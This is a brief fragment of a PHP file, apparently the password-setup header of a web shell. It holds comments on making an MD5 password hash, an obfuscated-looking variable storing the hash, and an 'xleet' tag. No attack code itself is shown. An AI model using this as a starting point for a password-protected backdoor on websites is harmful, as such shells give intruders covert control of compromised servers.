...
// Make a PHP file and write : 
// <?php echo(md5(readline("Enter your wished password: ")));
// Save and run it with :
// php yourfile.php 
// You'll get asked for password and it prints it md5 hashed out. Replace the value down below with it!
$▛ = "ede71b688bc78126c75eef2efa217839"; //xleet
